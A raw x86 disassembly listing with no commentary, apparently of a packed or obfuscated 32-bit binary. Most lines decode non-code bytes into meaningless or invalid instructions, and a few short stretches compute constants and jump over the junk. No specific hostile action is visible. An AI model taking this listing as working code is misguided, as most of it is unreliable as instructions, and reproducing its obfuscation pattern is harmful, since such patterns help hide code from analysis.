  40e2eb:	xchg   DWORD PTR [ecx+0x29],eax
  40e2ee:	push   esi
  40e2ef:	or     eax,0x200a1268
  40e2f4:	out    dx,al
  40e2f5:	cmp    BYTE PTR [edi+0xd70b244],al
  40e2fb:	icebp  
  40e2fc:	mov    bh,0x3a
  40e2fe:	dec    edi
  40e2ff:	adc    BYTE PTR [ebp-0x5699ba36],dh
  40e305:	xor    ebp,DWORD PTR [edi-0x73]
  40e308:	bound  esi,QWORD PTR [ecx-0x23]
  40e30b:	and    al,0xdd
  40e30d:	sub    ah,bl
  40e30f:	mov    WORD PTR [eax+0x10080d4],cs
  40e315:	lds    edx,FWORD PTR [ebx]
  40e317:	adc    DWORD PTR [ebx+ecx*2],esp
  40e31a:	std    
  40e31b:	xor    BYTE PTR [edi+0x5c61a3dd],cl
  40e321:	and    al,0x98
  40e323:	mov    cl,0xa8
  40e325:	inc    ecx
  40e326:	je     0x40e2b6
  40e328:	mov    ebx,0x8bc0ca5f
  40e32d:	inc    esp
  40e32e:	dec    ebx
  40e32f:	pop    ds
  40e330:	aas    
  40e331:	loop   0x40e337
  40e333:	or     bl,bh
  40e335:	fstp   st(0)
  40e338:	mov    eax,ds:0x90650b1d
  40e33d:	ret    0xc66
  40e340:	dec    esi
  40e341:	(bad)  [ebx+eax*8]
  40e344:	imul   ebp,DWORD PTR [ecx+0xc],0x10
  40e348:	pop    edx
  40e349:	out    0xcc,al
  40e34b:	jg     0x40e339
  40e34d:	bound  ebp,QWORD PTR [ebx]
  40e34f:	rcr    DWORD PTR [esi-0x712897be],cl
  40e355:	ss sbb edi,DWORD PTR gs:0x5cb8940d
  40e35d:	push   edx
  40e35e:	push   0xffffffa9
  40e360:	outs   dx,DWORD PTR ds:[esi]
  40e361:	xlat   BYTE PTR ds:[ebx]
  40e362:	dec    esp
  40e363:	aad    0xf0
  40e365:	call   0x1038:0x3b13909e
  40e36c:	ins    BYTE PTR es:[edi],dx
  40e36d:	cmp    al,0xfc
  40e36f:	(bad)  
  40e370:	addr16 retf 
  40e372:	lods   eax,DWORD PTR ds:[esi]
  40e373:	mov    esp,0xcd8f277f
  40e378:	icebp  
  40e379:	add    edx,DWORD PTR [ebp-0x7abc83f6]
  40e37f:	je     0x40e37c
  40e381:	int3   
  40e382:	adc    ecx,0x0
  40e385:	icebp  
  40e386:	rol    ebx,1
  40e388:	leave  
  40e389:	or     eax,0xfffffff7
  40e38c:	jle    0x40e3ea
  40e38e:	pop    ds
  40e38f:	push   ss
  40e390:	xor    eax,0x30a83112
  40e395:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e396:	or     eax,DWORD PTR [ebx]
  40e398:	data16 shl dl,cl
  40e39b:	imul   ecx,DWORD PTR [ecx+ecx*8],0x1de844a4
  40e3a2:	ins    DWORD PTR es:[edi],dx
  40e3a3:	mov    edx,0x53f74d2c
  40e3a8:	outs   dx,BYTE PTR ds:[esi]
  40e3a9:	test   BYTE PTR [edi-0x780c1232],0x9c
  40e3b0:	mov    bl,0x94
  40e3b2:	out    0x3a,eax
  40e3b4:	or     bl,al
  40e3b6:	sub    ecx,DWORD PTR [ebx]
  40e3b8:	repnz xor DWORD PTR [ecx+0x35],ebx
  40e3bc:	sbb    DWORD PTR [edx+0x5b],0x800169aa
  40e3c3:	or     al,0x44
  40e3c5:	cmp    dh,BYTE PTR [edi+0x9830344]
  40e3cb:	pop    esp
  40e3cc:	cmp    eax,0xedb860c5
  40e3d1:	jmp    0x40e378
  40e3d3:	and    BYTE PTR [ebx+esi*1],0xd7
  40e3d7:	mov    ebp,0x8e265468
  40e3dc:	jno    0x40e36f
  40e3de:	push   esi
  40e3df:	mov    ds:0x7ace8d13,al
  40e3e4:	ss scas al,BYTE PTR es:[edi]
  40e3e6:	xor    ebp,DWORD PTR [ebx+eiz*1+0x6d]
  40e3ea:	mov    edx,0x479d6095
  40e3ef:	leave  
  40e3f0:	arpl   WORD PTR [esi],bx
  40e3f2:	shl    BYTE PTR [ebp+0x40],0xc9
  40e3f6:	in     al,dx
  40e3f7:	inc    ebx
  40e3f8:	jnp    0x40e3d8
  40e3fa:	sbb    al,0xde
  40e3fc:	sub    DWORD PTR [esi],0x5789eff6
  40e402:	sbb    BYTE PTR [esi+0x17119e4e],bh
  40e408:	sub    DWORD PTR [esi-0x74866b09],0xffffffeb
  40e40f:	loopne 0x40e415
  40e411:	add    BYTE PTR [esi],bh
  40e413:	dec    ebx
  40e414:	in     al,dx
  40e415:	inc    eax
  40e416:	sub    eax,0xecf20120
  40e41b:	pop    ecx
  40e41c:	rol    DWORD PTR [ebx+0x6cf18687],0x38
  40e423:	lods   eax,DWORD PTR ds:[esi]
  40e424:	mov    cl,0xb2
  40e426:	into   
  40e427:	out    dx,al
  40e428:	xor    eax,0x3f35602d
  40e42d:	pop    esp
  40e42e:	iret   
  40e42f:	loop   0x40e43a
  40e431:	fsub   DWORD PTR [ebx]
  40e433:	jecxz  0x40e419
  40e435:	sub    bl,BYTE PTR [esi+ebx*4]
  40e438:	pop    eax
  40e439:	fimul  WORD PTR cs:[ebx+0x39]
  40e43d:	sub    BYTE PTR [edx+edx*4],bh
  40e440:	and    ecx,DWORD PTR ds:0x1514d11d
  40e446:	pop    edi
  40e447:	scas   al,BYTE PTR es:[edi]
  40e448:	or     BYTE PTR [ecx],dl
  40e44a:	(bad)  
  40e44b:	xor    edx,edx
  40e44d:	and    eax,0x6d33
  40e452:	lea    ecx,[ecx+eax*1-0x6520]
  40e459:	mov    eax,DWORD PTR [ebp+0x8]
  40e45c:	mov    ebx,DWORD PTR [ebp-0x4]
  40e45f:	add    eax,edi
  40e461:	div    ebx
  40e463:	mov    edx,DWORD PTR [ebp-0x8]
  40e466:	mov    ebx,0x940a7
  40e46b:	sub    eax,edx
  40e46d:	xor    edx,edx
  40e46f:	div    ebx
  40e471:	add    eax,esi
  40e473:	cmp    ecx,eax
  40e475:	jb     0x40db77
  40e47b:	xor    ebx,ebx
  40e47d:	inc    ebx
  40e47e:	mov    DWORD PTR [ebp+0xc],0x77bd
  40e485:	mov    DWORD PTR [ebp+0x8],0x4f2a
  40e48c:	mov    DWORD PTR [ebp-0x8],0x4738
  40e493:	mov    DWORD PTR [ebp-0xc],0x6c4e
  40e49a:	mov    DWORD PTR [ebp-0x10],0x7f0d
  40e4a1:	mov    DWORD PTR [ebp-0x14],0x64ec
  40e4a8:	mov    DWORD PTR [ebp-0x18],0x1984
  40e4af:	mov    DWORD PTR [ebp-0x1c],0x293
  40e4b6:	mov    eax,DWORD PTR [ebp+0x8]
  40e4b9:	mov    ecx,DWORD PTR [ebp+0xc]
  40e4bc:	add    eax,0x1ef2
  40e4c1:	and    eax,ecx
  40e4c3:	xor    eax,0x7240
  40e4c8:	mov    ecx,0x7aaa
  40e4cd:	jmp    0x40e791
  40e4d2:	mov    eax,0x5a62ef3c
  40e4d7:	and    bl,BYTE PTR [edx+edi*1]
  40e4da:	ss dec esi
  40e4dc:	xor    DWORD PTR [eax-0x55da436f],0x1818c289
  40e4e6:	rcl    BYTE PTR [eax+ebx*1],cl
  40e4e9:	sbb    BYTE PTR [eax-0x3bd8bf35],ah
  40e4ef:	push   ecx
  40e4f0:	push   esi
  40e4f1:	jae    0x40e572
  40e4f3:	dec    esi
  40e4f4:	push   es
  40e4f5:	adc    BYTE PTR [esi+0x4bcbffdd],bl
  40e4fb:	pop    eax
  40e4fc:	lock aam 0x3a
  40e4ff:	pop    esi
  40e500:	or     al,0xf4
  40e502:	das    
  40e503:	inc    eax
  40e504:	mov    dh,0x4d
  40e506:	inc    ebx
  40e507:	mov    cl,0xd0
  40e509:	or     edx,edx
  40e50b:	daa    
  40e50c:	adc    eax,0xce38ae43
  40e511:	(bad)  
  40e512:	xchg   esp,eax
  40e513:	loope  0x40e50b
  40e515:	or     edi,esi
  40e517:	fst    st(6)
  40e519:	nop
  40e51a:	sbb    dh,BYTE PTR [edx-0x45]
  40e51d:	lock mov al,ds:0x25957e88
  40e523:	(bad)  
  40e524:	inc    edi
  40e525:	shl    bh,cl
  40e527:	cmp    al,0x4a
  40e529:	jg     0x40e4d4
  40e52b:	or     ecx,DWORD PTR [esi-0x2]
  40e52e:	aaa    
  40e52f:	jno    0x40e532
  40e531:	(bad)  [esi-0x1e222a72]
  40e537:	jecxz  0x40e4e8
  40e539:	cmp    eax,0xdd7a30d4
  40e53e:	imul   eax,eax,0xccc8891c
  40e544:	sar    bl,cl
  40e546:	mov    bl,0x4b
  40e548:	in     al,0x22
  40e54a:	int    0x51
  40e54c:	or     al,0xfb
  40e54e:	stos   DWORD PTR es:[edi],eax
  40e54f:	scas   eax,DWORD PTR es:[edi]
  40e550:	ins    DWORD PTR es:[edi],dx
  40e551:	mov    dh,0xdc
  40e553:	adc    esi,DWORD PTR [edi-0x5c]
  40e556:	cmp    bh,BYTE PTR [esi+0x53]
  40e559:	iret   
  40e55a:	push   cs
  40e55b:	cwde   
  40e55c:	(bad)  
  40e55d:	mov    edx,0x28b5eca2
  40e562:	ja     0x40e54e
  40e564:	loop   0x40e4ee
  40e566:	jmp    0x1be67a39
  40e56b:	add    eax,0x8e8959f3
  40e570:	aaa    
  40e571:	out    0xf2,eax
  40e573:	or     ebx,edx
  40e575:	ficomp DWORD PTR [edx+ebp*1-0x1c]
  40e579:	fsubrp st(0),st
  40e57b:	mov    al,ds:0x2409d147
  40e580:	inc    ecx
  40e581:	inc    esp
  40e582:	sub    BYTE PTR [esi+0x18],dh
  40e585:	stc    
  40e586:	lods   eax,DWORD PTR ds:[esi]
  40e587:	add    bh,ch
  40e589:	jns    0x40e52d
  40e58b:	stos   BYTE PTR es:[edi],al
  40e58c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e58d:	retf   0x32b7
  40e590:	rcr    DWORD PTR [eax-0x14452291],1
  40e596:	mov    eax,0x3ba4caea
  40e59b:	cli    
  40e59c:	rcl    DWORD PTR [ecx-0x6f],1
  40e59f:	xor    dh,BYTE PTR [ecx-0x4b]
  40e5a2:	sub    eax,edi
  40e5a4:	push   esi
  40e5a5:	nop
  40e5a6:	cmp    DWORD PTR [ebx],esi
  40e5a8:	stos   DWORD PTR es:[edi],eax
  40e5a9:	mov    ds:0x2050bf3d,al
  40e5ae:	adc    edx,edi
  40e5b0:	add    eax,0x8721e0f9
  40e5b5:	sbb    eax,0x46dd6d75
  40e5ba:	mov    ds:0xb3d3bf18,eax
  40e5bf:	pop    ss
  40e5c0:	or     al,0xbf
  40e5c2:	xchg   cl,ch
  40e5c4:	mov    dl,0x7d
  40e5c6:	pushf  
  40e5c7:	adc    dh,ah
  40e5c9:	jno    0x40e5eb
  40e5cb:	cmp    BYTE PTR [ecx+eiz*2-0x1869937],dh
  40e5d2:	cmp    eax,0x70497137
  40e5d7:	enter  0x9941,0x1e
  40e5db:	das    
  40e5dc:	adc    al,0x2d
  40e5de:	xchg   edi,eax
  40e5df:	adc    eax,0xd6829ca6
  40e5e4:	mov    WORD PTR [ecx],?
  40e5e6:	bound  esp,QWORD PTR [eax-0x3077324c]
  40e5ec:	jle    0x40e625
  40e5ee:	dec    edi
  40e5ef:	loop   0x40e5f4
  40e5f1:	mov    eax,ds:0x78117eff
  40e5f6:	and    eax,0x1415e63d
  40e5fb:	mov    dh,0xaa
  40e5fd:	push   eax
  40e5fe:	cmp    dl,ah
  40e600:	jne    0x40e5c7
  40e602:	lods   eax,DWORD PTR ss:[esi]
  40e604:	sub    eax,0xcc1a637b
  40e609:	push   edi
  40e60a:	ins    BYTE PTR es:[edi],dx
  40e60b:	cmp    eax,edi
  40e60d:	test   eax,0x20f8993a
  40e612:	ror    DWORD PTR [edx+eiz*2-0x67],1
  40e616:	adc    DWORD PTR [esp+esi*1],edi
  40e619:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e61a:	dec    ecx
  40e61b:	pop    eax
  40e61c:	popa   
  40e61d:	pop    ds
  40e61e:	cmp    eax,0x51ee99b
  40e623:	pusha  
  40e624:	clc    
  40e625:	push   0x9c127c3d
  40e62a:	cmp    edx,DWORD PTR [ecx+0x15c2dd83]
  40e630:	repz (bad) 
  40e632:	scas   eax,DWORD PTR es:[edi]
  40e633:	mov    edi,0xdc6d9abb
  40e638:	dec    ecx
  40e639:	(bad)  
  40e63a:	cld    
  40e63b:	sub    al,0x5e
  40e63d:	mov    ecx,0xe9fd434e
  40e642:	sub    al,0xba
  40e644:	imul   ebx,DWORD PTR [ecx],0xffffffc7
  40e647:	xchg   ebx,eax
  40e648:	test   al,0xf0
  40e64a:	(bad)  
  40e64b:	adc    al,0xa2
  40e64d:	call   0xc501:0xbde738f5
  40e654:	(bad)  
  40e655:	test   DWORD PTR [edx-0x7c],0xb819595e
  40e65c:	pop    esp
  40e65d:	call   0x136e:0x2c2ba0d7
  40e664:	inc    edx
  40e666:	inc    bh
  40e668:	sub    DWORD PTR [edx+0x4dc9deed],ecx
  40e66e:	cmp    BYTE PTR [eax+0x1344b2a2],0xd0
  40e675:	inc    edi
  40e676:	mov    bh,0xcd
  40e678:	push   edx
  40e679:	xchg   edx,eax
  40e67a:	push   esp
  40e67b:	xchg   esp,eax
  40e67c:	sub    ecx,DWORD PTR ds:0x8e0c232c
  40e682:	xlat   BYTE PTR ds:[ebx]
  40e683:	outs   dx,BYTE PTR ds:[esi]
  40e684:	into   
  40e685:	call   DWORD PTR [ebp+0x500a05b4]
  40e68b:	add    BYTE PTR [edx+0x34],dh
  40e68e:	jge    0x40e6f2
  40e690:	and    al,0xc6
  40e692:	aas    
  40e693:	fdivr  QWORD PTR [edi+0x6309b91e]
  40e699:	add    edx,DWORD PTR [edx]
  40e69b:	add    eax,0xa89f6a62
  40e6a0:	test   ch,0xb
  40e6a3:	fcomi  st,st(0)
  40e6a5:	loop   0x40e6ad
  40e6a7:	mov    bh,0x6b
  40e6a9:	je     0x40e70d
  40e6ab:	add    cl,al
  40e6ad:	loop   0x40e700
  40e6af:	loope  0x40e6e5
  40e6b1:	es jno 0x40e6b1
  40e6b4:	fstp   DWORD PTR [ecx+0x42b1e2b0]
  40e6ba:	mov    esi,0xe64f8909
  40e6bf:	xchg   edx,eax
  40e6c0:	test   eax,0xbdaf3587
  40e6c5:	add    al,0x6b
  40e6c7:	sbb    bh,cl
  40e6c9:	xchg   edi,eax
  40e6ca:	mov    ds:0xc339a972,al
  40e6cf:	xchg   ebp,eax
  40e6d0:	xchg   edx,eax
  40e6d1:	mov    ebx,0xd9ce823d
  40e6d6:	sbb    bh,BYTE PTR [ebp+edi*1+0x48d6baeb]
  40e6dd:	push   ds
  40e6de:	jge    0x40e713
  40e6e0:	shl    BYTE PTR [eax+0x2afb0c4b],0xc1
  40e6e7:	mov    edx,0x4ee6ee84
  40e6ec:	bound  ecx,QWORD PTR [eax-0x18ac86c2]
  40e6f2:	dec    ecx
  40e6f3:	shr    DWORD PTR [ebp-0x2e],1
  40e6f6:	jnp    0x40e772
  40e6f8:	dec    ebx
  40e6f9:	sbb    DWORD PTR [ebx+0x45],edi
  40e6fc:	pop    ebp
  40e6fd:	push   esp
  40e6fe:	push   esi
  40e6ff:	imul   ecx,DWORD PTR [bx+0x2bac],0x12
  40e705:	in     al,dx
  40e706:	xchg   ebp,eax
  40e707:	mov    gs,WORD PTR [ebp-0x5a]
  40e70a:	call   0x7b0e:0x1f59bb50
  40e711:	mov    bh,0xb7
  40e713:	mov    al,ds:0xc64c1c97
  40e718:	in     eax,0x90
  40e71a:	dec    eax
  40e71b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e71c:	jmp    0x40e6af
  40e71e:	jns    0x40e6ab
  40e720:	and    eax,0xf6544fd0
  40e725:	ret    
  40e726:	scas   al,BYTE PTR es:[edi]
  40e727:	xchg   ecx,eax
  40e728:	test   DWORD PTR [eax-0x1c459f40],ebx
  40e72e:	mov    eax,ds:0x2e096cd9
  40e733:	outs   dx,BYTE PTR ds:[esi]
  40e734:	stos   DWORD PTR es:[edi],eax
  40e735:	adc    ch,ah
  40e737:	push   0xffffffd1
  40e739:	jmp    0x8999:0x4a42ea11
  40e740:	sbb    ch,BYTE PTR [edi]
  40e742:	and    eax,0x96789552
  40e747:	xor    BYTE PTR [esi],dh
  40e749:	jl     0x40e702
  40e74b:	ins    BYTE PTR es:[edi],dx
  40e74c:	sub    eax,DWORD PTR [edx+0x40]
  40e74f:	lods   eax,DWORD PTR ds:[esi]
  40e750:	gs pop ds
  40e752:	dec    ebp
  40e753:	or     eax,edx
  40e755:	stc    
  40e756:	pop    edx
  40e757:	mov    esi,0x7957a171
  40e75c:	ret    0xef47
  40e75f:	push   ebp
  40e760:	lock inc esi
  40e762:	imul   esi,DWORD PTR [ebx+0x95a1cf8],0xcfbcee24
  40e76c:	and    ch,ah
  40e76e:	cmp    BYTE PTR [esi-0x19ddf72e],al
  40e774:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e775:	into   
  40e776:	sbb    al,0xea
  40e778:	push   eax
  40e779:	xchg   edx,eax
  40e77a:	dec    BYTE PTR [ecx+0x45fbf511]
  40e780:	push   eax
  40e781:	inc    ebp
  40e782:	push   ebx
  40e783:	dec    edi
  40e784:	das    
  40e785:	je     0x40e756
  40e787:	xchg   edx,eax
  40e788:	cs jle 0x40e7f8
  40e78b:	stos   DWORD PTR es:[edi],eax
  40e78c:	xor    BYTE PTR [edi-0x13],dl
  40e78f:	add    cl,ah
  40e791:	sub    ecx,eax
  40e793:	mov    DWORD PTR [ebp+0xc],0x8d3
  40e79a:	mov    DWORD PTR [ebp+0x8],0x2392
  40e7a1:	mov    DWORD PTR [ebp-0x20],ebx
  40e7a4:	mov    DWORD PTR [ebp-0x24],0x338f
  40e7ab:	mov    DWORD PTR [ebp-0x28],0x61c9
  40e7b2:	mov    eax,DWORD PTR [ebp+0x8]
  40e7b5:	mov    edx,DWORD PTR [ebp+0xc]
  40e7b8:	imul   eax,edx
  40e7bb:	xor    eax,0x40a0
  40e7c0:	or     eax,0x1a48
  40e7c5:	xor    eax,0x139ddb0
  40e7ca:	mov    esi,ecx
  40e7cc:	sub    esi,eax
  40e7ce:	mov    eax,DWORD PTR [ebp-0x28]
  40e7d1:	mov    edx,DWORD PTR [ebp-0x24]
  40e7d4:	mov    edi,DWORD PTR [ebp-0x20]
  40e7d7:	or     eax,0x1cc2
  40e7dc:	sub    eax,edx
  40e7de:	jmp    0x40eaa2
  40e7e3:	or     BYTE PTR [esp+ebx*1-0xd],0x1c
  40e7e8:	loop   0x40e828
  40e7ea:	sbb    bh,BYTE PTR [esi]
  40e7ec:	call   DWORD PTR [ebx-0x56]
  40e7ef:	outs   dx,BYTE PTR ds:[esi]
  40e7f0:	adc    DWORD PTR [ecx+0x18be42b0],eax
  40e7f6:	sbb    dl,dl
  40e7f8:	adc    al,0x18
  40e7fa:	sbb    BYTE PTR [eax],ch
  40e7fc:	push   DWORD PTR [ecx+0x4cb1a12f]
  40e802:	xchg   ebp,eax
  40e803:	sti    
  40e804:	pop    edx
  40e805:	mov    WORD PTR [esi-0x1c],es
  40e808:	jp     0x40e78d
  40e80a:	mov    eax,0x8b9d2c56
  40e80f:	dec    edx
  40e810:	jbe    0x40e7ac
  40e812:	inc    esp
  40e813:	add    dl,BYTE PTR [edx+0x6b0524b3]
  40e819:	ss push 0x73
  40e81c:	jmp    0x40e87e
  40e81e:	in     eax,0x85
  40e820:	in     eax,dx
  40e821:	imul   edx,DWORD PTR ds:0x9f1237b5,0x34
  40e828:	mov    WORD PTR [ebx-0x43b26e41],es
  40e82e:	rcl    BYTE PTR [esi],cl
  40e830:	fld    DWORD PTR [esi+0x3f7b5efd]
  40e836:	and    ecx,ecx
  40e838:	sub    al,0xf8
  40e83a:	inc    edi
  40e83b:	imul   ecx,DWORD PTR [edx-0xa],0x27fd9d92
  40e842:	(bad)  
  40e844:	je     0x40e8c0
  40e846:	rcr    BYTE PTR [ebp-0x29],cl
  40e849:	outs   dx,DWORD PTR ds:[esi]
  40e84a:	jo     0x40e7d0
  40e84c:	xlat   BYTE PTR ds:[ebx]
  40e84d:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40e84f:	and    esi,DWORD PTR [eax+0x76]
  40e852:	pop    edi
  40e853:	xor    eax,0x8acd082c
  40e858:	pop    eax
  40e859:	or     esi,ecx
  40e85b:	fwait
  40e85c:	les    eax,FWORD PTR [esi-0x8]
  40e85f:	adc    DWORD PTR [ebx-0xb6e835c],ecx
  40e865:	(bad)  
  40e866:	mov    esi,0xea5ab7f0
  40e86b:	lods   eax,DWORD PTR ds:[esi]
  40e86c:	in     eax,0x57
  40e86e:	push   cs
  40e86f:	and    eax,0xc67b7598
  40e874:	mov    bh,0x1e
  40e876:	sub    BYTE PTR [esi+ebp*2],dl
  40e879:	imul   esi,ebx,0x7901a790
  40e87f:	mov    al,bl
  40e881:	mov    bl,0x16
  40e883:	cwde   
  40e884:	lods   eax,DWORD PTR ds:[esi]
  40e885:	or     DWORD PTR [ebx-0x149285e7],ebp
  40e88b:	gs nop
  40e88d:	sub    eax,0xdcfe0cf5
  40e892:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e893:	dec    ebx
  40e894:	dec    edi
  40e895:	sar    BYTE PTR [esi],0xa3
  40e898:	repnz add DWORD PTR [ecx],esp
  40e89b:	fld    TBYTE PTR [edx-0x75a6e0b4]
  40e8a1:	(bad)
  40e8a4:	xchg   esi,eax
  40e8a5:	sub    dl,BYTE PTR [eax+0x6c]
  40e8a8:	sub    DWORD PTR [edx+edx*8],esi
  40e8ab:	shr    BYTE PTR [ebx-0x4c],cl
  40e8ae:	sbb    al,bh
  40e8b0:	shl    esi,cl
  40e8b2:	ficomp DWORD PTR [eax+eiz*1+0x726f7c13]
  40e8b9:	jl     0x40e936
  40e8bb:	cmp    DWORD PTR ds:0x9a8e174d,0x4a875fd
  40e8c5:	fdiv   st(6),st
  40e8c7:	pop    edi
  40e8c8:	rol    esi,cl
  40e8ca:	fst    st(0)
  40e8cc:	or     eax,0xb9b9ccd9
  40e8d1:	enter  0x5b58,0xc6
  40e8d5:	mov    ebx,0xf059e21f
  40e8da:	aaa    
  40e8db:	rcr    ebx,cl
  40e8dd:	fstp   QWORD PTR [eax+0x20]
  40e8e0:	xchg   ebp,eax
  40e8e1:	mov    al,0x25
  40e8e3:	xchg   ecx,eax
  40e8e4:	int    0xda
  40e8e6:	nop
  40e8e7:	push   esp
  40e8e8:	inc    ebx
  40e8e9:	sahf   
  40e8ea:	jo     0x40e956
  40e8ec:	or     ch,al
  40e8ee:	push   ss
  40e8ef:	add    DWORD PTR [ebx+0x2c317b10],edx
  40e8f5:	sahf   
  40e8f6:	loope  0x40e950
  40e8f8:	cmp    al,0xca
  40e8fa:	add    dl,BYTE PTR [edi]
  40e8fc:	fwait
  40e8fd:	out    0xfb,al
  40e8ff:	fistp  WORD PTR [edx]
  40e901:	add    al,0x82
  40e903:	fnstsw WORD PTR [ebp-0xae9c7d2]
  40e909:	add    ebp,ebx
  40e90b:	xor    ah,BYTE PTR [edi-0x17b6df07]
  40e911:	pop    ebx
  40e912:	dec    esi
  40e913:	stos   BYTE PTR es:[edi],al
  40e914:	je     0x40e8c5
  40e916:	mov    dh,0xcf
  40e918:	in     al,0x69
  40e91a:	outs   dx,DWORD PTR ds:[esi]
  40e91b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e91c:	int3   
  40e91d:	dec    ebx
  40e91e:	xchg   edi,eax
  40e91f:	or     BYTE PTR [ecx+0x2a],cl
  40e922:	(bad)  
  40e924:	rcl    BYTE PTR ds:0x95973a38,1
  40e92a:	sti    
  40e92b:	cmp    BYTE PTR [edx-0x7e],0xa7
  40e92f:	test   cl,al
  40e931:	or     DWORD PTR [edx-0x1b43e39f],esp
  40e937:	(bad)  
  40e938:	div    DWORD PTR [edx+0x31]
  40e93b:	fcomp  QWORD PTR [ecx+0x77a688aa]
  40e941:	mov    esp,0x13b3ca94
  40e946:	xor    BYTE PTR [ecx-0x57ee67fc],dl
  40e94c:	aaa    
  40e94d:	mov    ecx,0x6ec1d4e1
  40e952:	sub    edx,ebp
  40e954:	pop    ss
  40e955:	pop    edi
  40e956:	scas   eax,DWORD PTR es:[edi]
  40e957:	sbb    BYTE PTR [edx+0x4c],bl
  40e95a:	dec    edi
  40e95b:	fnstcw WORD PTR [ecx+0x14]
  40e95e:	jmp    0x40e928
  40e960:	cdq    
  40e961:	ja     0x40e969
  40e963:	xchg   DWORD PTR [ebx+0x56dc2914],esp
  40e969:	imul   BYTE PTR [edx+0x1893d44d]
  40e96f:	sub    eax,0xc0eccb0e
  40e974:	(bad)  
  40e975:	in     eax,dx
  40e976:	sbb    DWORD PTR [edi+0x17f763a8],0x8ef1152a
  40e980:	mov    edx,0xa4c3c5da
  40e985:	(bad)  
  40e986:	lods   eax,DWORD PTR cs:[esi]
  40e988:	dec    edx
  40e989:	(bad)
  40e98d:	rol    DWORD PTR ds:0x8dacb354,cl
  40e993:	mov    ebx,0x4e07aa09
  40e998:	xor    eax,0x5d14bb84
  40e99d:	in     eax,0x95
  40e99f:	xor    ah,dh
  40e9a1:	bnd call 0x5addd58c
  40e9a7:	pop    ebp
  40e9a8:	out    dx,eax
  40e9a9:	call   0x1f5a9f6b
  40e9ae:	loop   0x40e9e9
  40e9b0:	xor    eax,0x99406b5e
  40e9b5:	imul   esp,DWORD PTR [edx],0xffffff9e
  40e9b8:	stos   BYTE PTR es:[edi],al
  40e9b9:	clc    
  40e9ba:	jo     0x40e98b
  40e9bc:	add    edx,DWORD PTR ds:0xdab0f0a4
  40e9c2:	in     eax,dx
  40e9c3:	imul   ebx,DWORD PTR [ebx-0x618fa933],0xcec33bdf
  40e9cd:	outs   dx,DWORD PTR ds:[esi]
  40e9ce:	loope  0x40e9ab
  40e9d0:	mov    esp,0x6cda4011
  40e9d5:	sbb    DWORD PTR [ebx-0x5f],esp
  40e9d8:	mov    ds:0xe632593d,eax
  40e9dd:	mov    edx,0x87206cbc
  40e9e2:	cmp    al,0x15
  40e9e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9e5:	inc    ecx
  40e9e6:	cwde   
  40e9e7:	mov    ds:0xa1ea3929,al
  40e9ec:	dec    esp
  40e9ed:	or     al,0xd3
  40e9ef:	xlat   BYTE PTR ds:[ebx]
  40e9f0:	add    esp,DWORD PTR [ebx]
  40e9f2:	fnstcw WORD PTR [esi]
  40e9f4:	add    eax,0x95f2347
  40e9f9:	bnd call 0xfe1faf34
  40e9ff:	xor    al,0x91
  40ea01:	pop    ebp
  40ea02:	and    eax,0xb889336
  40ea07:	lods   al,BYTE PTR ds:[esi]
  40ea08:	mov    gs,WORD PTR [eax]
  40ea0a:	leave  
  40ea0b:	arpl   WORD PTR [edx],sp
  40ea0d:	mov    eax,0xcadd538c
  40ea12:	cmp    dh,BYTE PTR [ebp-0x1abee90b]
  40ea18:	and    eax,0x7e30f3ae
  40ea1d:	dec    ecx
  40ea1e:	(bad)
  40ea22:	iret   
  40ea23:	hlt    
  40ea24:	adc    al,0xbb
  40ea26:	push   eax
  40ea27:	add    esp,DWORD PTR [eax+edi*4-0x5a48d08b]
  40ea2e:	and    DWORD PTR [edi-0x14],edi
  40ea31:	shl    BYTE PTR [esi+0x2f400047],1
  40ea37:	xchg   esp,esi
  40ea39:	fild   DWORD PTR [edx+0x40401adb]
  40ea3f:	mov    ds,WORD PTR [edx+eiz*1-0x11]
  40ea43:	repz addr16 in eax,0x78
  40ea47:	fs mov bl,0xb9
  40ea4a:	iret   
  40ea4b:	aas    
  40ea4c:	adc    esp,0xffffffe6
  40ea4f:	cmp    ecx,DWORD PTR [ecx-0x2c0ae8c0]
  40ea55:	imul   edx,ebp,0x39
  40ea58:	or     ecx,DWORD PTR [eax-0x46e931a8]
  40ea5e:	adc    al,0x5c
  40ea60:	pop    ebx
  40ea61:	out    0x56,al
  40ea63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea64:	inc    edx
  40ea65:	or     ebp,esp
  40ea67:	inc    edi
  40ea68:	and    eax,0xafba070a
  40ea6d:	and    bh,BYTE PTR [ecx-0x227d8be6]
  40ea73:	inc    edx
  40ea74:	pop    ds
  40ea75:	inc    edx
  40ea76:	sub    al,0xd4
  40ea78:	cmc    
  40ea79:	sub    eax,0x79224c21
  40ea7e:	imul   esp,DWORD PTR [ebx],0x5e56d3a1
  40ea84:	out    0xb,eax
  40ea86:	dec    esp
  40ea87:	jmp    0xb918:0xb66804d7
  40ea8e:	xchg   esi,esi
  40ea90:	repz push 0x7d2d3801
  40ea96:	stc    
  40ea97:	add    DWORD PTR [esi+0x2],0x19feddbe
  40ea9e:	cli    
  40ea9f:	pop    esi
  40eaa0:	sbb    DWORD PTR [edx+0x33],eax
  40eaa3:	shl    bh,cl
  40eaa5:	test   DWORD PTR [ebx+0x42256815],0xd4928b00
  40eaaf:	add    DWORD PTR [eax],eax
  40eab1:	add    BYTE PTR [ebx],ch
  40eab3:	ror    BYTE PTR [ebx+0x48a1045],1
  40eab9:	push   es
  40eaba:	mov    BYTE PTR [edx+ecx*1-0x1c12],al
  40eac1:	mov    eax,DWORD PTR [ebp-0x1c]
  40eac4:	mov    edx,DWORD PTR [ebp-0x18]
  40eac7:	imul   eax,edx
  40eaca:	mov    edx,DWORD PTR [ebp-0x14]
  40eacd:	imul   eax,eax,0x262b
  40ead3:	or     eax,edx
  40ead5:	mov    edx,DWORD PTR [ebp-0x10]
  40ead8:	or     eax,edx
  40eada:	xor    eax,0x59f6
  40eadf:	jmp    0x40eda3
  40eae4:	sub    BYTE PTR [edi-0x3c],0x71
  40eae8:	pushf  
